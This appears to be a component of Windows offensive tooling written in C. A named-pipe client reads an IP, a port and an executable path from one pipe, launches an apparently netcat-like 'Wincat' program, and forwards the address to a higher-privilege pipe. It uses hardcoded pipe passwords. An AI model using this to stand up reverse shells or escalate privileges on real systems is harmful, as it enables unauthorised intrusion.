#include <windows.h> 
#include <stdio.h>


#define BUFSIZE 512
#define MAX_CONNECTION_TRY 20

#define MATCH(string1,string2) (strcmp(string1, string2) == 0)

typedef struct{
    char ipAddress[BUFSIZE];//IP_ADDRESS_LEN
    char port[BUFSIZE];
    char pathExeToRun[BUFSIZE];
}PipeDataStruct;

BOOL RequestInfoFromServer(HANDLE hPipe, CHAR* lpvMessage, char* chBuf){
    DWORD cbToWrite = (DWORD)(strlen(lpvMessage) + 1);
    DWORD cbWritten = 0;
    DWORD cbRead = 0;
    BOOL  fSuccess;

    memset(chBuf, 0x00, BUFSIZE);

    printf("CLIENT> %s (%d)\n", lpvMessage, cbToWrite);
    if (!WriteFile(hPipe, lpvMessage, cbToWrite, &cbWritten, NULL)){
        printf("WriteFile to pipe failed. GLE=%d\n", GetLastError());
        return FALSE;
    }

    fSuccess = ReadFile(hPipe, chBuf, BUFSIZE, &cbRead, NULL);
    if (fSuccess)
        printf("SERVER> %s\n", chBuf);
    while (!fSuccess && GetLastError() != ERROR_MORE_DATA){
        fSuccess = ReadFile(hPipe, chBuf, BUFSIZE, &cbRead, NULL);
        printf("SERVER> %s\n", chBuf);
    }
    if (!fSuccess){
        printf("ReadFile from pipe failed. GLE=%d\n", GetLastError());
        return FALSE;
    }
    return TRUE;
}

BOOL ConnectServerPipe(HANDLE* pHanPipe, const char* pipeName){
    UINT iServerNotFound = 0;
    HANDLE hPipe;
    *pHanPipe = NULL;

    hPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    while (hPipe == INVALID_HANDLE_VALUE && iServerNotFound < 20){
        DWORD lastError = GetLastError();
        if (lastError == ERROR_FILE_NOT_FOUND){
            printf("[i] Could not open pipe. Wait 5 second !\n");
            Sleep(5000);
            iServerNotFound++;
        } else if (lastError == ERROR_PIPE_BUSY){
            printf("[i] Could not open pipe. Wait 5 second !\n");
            if (!WaitNamedPipeA(pipeName, 5000)){
                printf("Could not open pipe: 5 second wait timed out.");
                return FALSE;
            }
        } else{
            printf("Could not open pipe. GLE=%d\n", lastError);
            return FALSE;
        }
        hPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    }

    *pHanPipe = hPipe;
    return TRUE;
}
BOOL ConnectServerPipeLow(HANDLE* pHanPipe, PipeDataStruct* pipeDataStruct){
    HANDLE hPipe;
    const CHAR* pipeName = "\\\\.\\pipe\\mynamedpipeLow";

    if (ConnectServerPipe(&hPipe, pipeName)){
        DWORD dwMode = PIPE_READMODE_MESSAGE;

        if (SetNamedPipeHandleState(hPipe, &dwMode, NULL, NULL)){
            CHAR  chBuf[BUFSIZE];
            const char* password = "ekttKwf3PFzRCc9egZ5AKfd8FKvGjRu3DrHCTdwT5YKCk2dm9rSxByFzFNKb";

            if (RequestInfoFromServer(hPipe, (char*)password, chBuf) && MATCH("AUTH_OK", chBuf)){
                RequestInfoFromServer(hPipe, "GET_IP_ADDRESS", pipeDataStruct->ipAddress);
                RequestInfoFromServer(hPipe, "GET_PORT", pipeDataStruct->port);
                RequestInfoFromServer(hPipe, "GET_EXE_PATH", pipeDataStruct->pathExeToRun);
                *pHanPipe = hPipe;
                return TRUE;
            }
        } else
            printf("SetNamedPipeHandleState failed. GLE=%d\n", GetLastError());
        CloseHandle(hPipe);
    }
    return FALSE;
}

BOOL ConnectSernerPipeHight(PipeDataStruct pipeDataStruct){

    HANDLE hPipe;
    const CHAR* pipeName = "\\\\.\\pipe\\mynamedpipeHigh";

    if (ConnectServerPipe(&hPipe, pipeName)){
        DWORD dwMode = PIPE_READMODE_MESSAGE;

        if (SetNamedPipeHandleState(hPipe, &dwMode, NULL, NULL)){
            CHAR  input[BUFSIZE];
            CHAR  output[BUFSIZE];
            const char* password = "SeMf523hqsXxaAy8bUaCRPbW62UT7R4ybXqJZjNVDnKya9ggXJ6UjKku77mB";

            if (RequestInfoFromServer(hPipe, (char*)password, output) && MATCH("AUTH_OK", output)){
                sprintf_s(input, BUFSIZE, "SET_IP_ADDRESS %s", pipeDataStruct.ipAddress);
                RequestInfoFromServer(hPipe, input, output);
                sprintf_s(input, BUFSIZE, "SET_GET_PORT %s", pipeDataStruct.port);
                RequestInfoFromServer(hPipe, input, output);
                CloseHandle(hPipe);
                return TRUE;
            }
        } else
            printf("SetNamedPipeHandleState failed. GLE=%d\n", GetLastError());
        CloseHandle(hPipe);
    }

    return FALSE;
}
BOOL CreateProcessWincat(char* pathExeToRun){
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    //DWORD creationFlags = DETACHED_PROCESS;
    //DWORD creationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW;
    DWORD creationFlags = NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_NEW_PROCESS_GROUP;

    if (!CreateProcessA(NULL, pathExeToRun, NULL, NULL, FALSE, creationFlags, NULL, NULL, &si, &pi)){
        printf("CreateProcess failed (%d).\n", GetLastError());
        return FALSE;
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return TRUE;
}

BOOL PipeHandler(BOOL isAdmin){
    HANDLE hPipeLow;
    PipeDataStruct pipeDataStruct;

    if (ConnectServerPipeLow(&hPipeLow, &pipeDataStruct) &&
        CreateProcessWincat(pipeDataStruct.pathExeToRun)){
        char* tmpBuffer = (char*)malloc(BUFSIZE);
        if (tmpBuffer != NULL){
            if (ConnectSernerPipeHight(pipeDataStruct) && isAdmin){
                RequestInfoFromServer(hPipeLow, "STATUS 1", tmpBuffer);
            } else{
                RequestInfoFromServer(hPipeLow, "STATUS 0", tmpBuffer);
            }
            free(tmpBuffer);
        }
        CloseHandle(hPipeLow);
    }
    return TRUE;
}
